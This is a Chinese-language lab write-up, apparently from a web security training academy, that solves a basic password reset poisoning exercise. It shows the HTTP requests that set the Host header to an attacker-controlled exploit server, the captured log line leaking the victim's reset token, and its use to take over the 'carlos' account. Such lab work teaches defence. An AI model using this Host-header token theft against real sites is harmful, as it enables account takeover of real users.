# 实验：基础密码重置投毒

本实验存在密码重置投毒漏洞。用户 `carlos` 会粗心大意地点击他收到的电子邮件中的任何链接。为了解决本实验，请登录 Carlos 的账户。

你可以使用以下凭据登录自己的账户：`wiener:peter`。发送到此账户的任何电子邮件都可以通过利用服务器上的电子邮件客户端阅读。

## 步骤

探测
- 使用密码重置功能
    ```http
    POST /forgot-password HTTP/2
    Host: id.web-security-academy.net

    csrf=wxxD7CCiKBJte01fuDH4NkpXALnVubVo&username=wiener
    ```

- 查看邮箱
    ```log
    https://id.web-security-academy.net/forgot-password?temp-forgot-password-token=7s85wc3jtars2gx7c6dz4ktihx0cb64c
    ```

- 测试连续发送，csrf 令牌可复用


尝试 host 头攻击
- 修改重置请求中的 host 头部
    ```http
    POST /forgot-password HTTP/2
    Host: foo.bar
    ```

- 查看 email
    ```log
    https://foo.bar/forgot-password?temp-forgot-password-token=ipc1llf2qt7ck49hf3zqmnrmke5xzvti
    ```

- 成功投毒重置链接
    - 重置密码组件动态提取 host 头部以设置链接


发送投毒重置链接到目标用户
- 发送投毒请求
    ```http
    POST /forgot-password HTTP/2
    Host: exploit-id.exploit-server.net

    csrf=wxxD7CCiKBJte01fuDH4NkpXALnVubVo&username=carlos
    ```
    - 设置 host 头部为攻击者端点，用户名为目标用户

- 查看攻击者服务器 log
    ```log
    10.0.4.182      2026-08-17 01:37:43 +0000 "GET /forgot-password?temp-forgot-password-token=8p1b78neyjjl490zu8hq0y2o9pq7qhj2 HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
    ```

- 使用密码重置令牌到密码重置端点
    ```
    https://id.web-security-academy.net/forgot-password?temp-forgot-password-token=8p1b78neyjjl490zu8hq0y2o9pq7qhj2
    ```

- 成功返回设置新密码页面，并成功修改密码
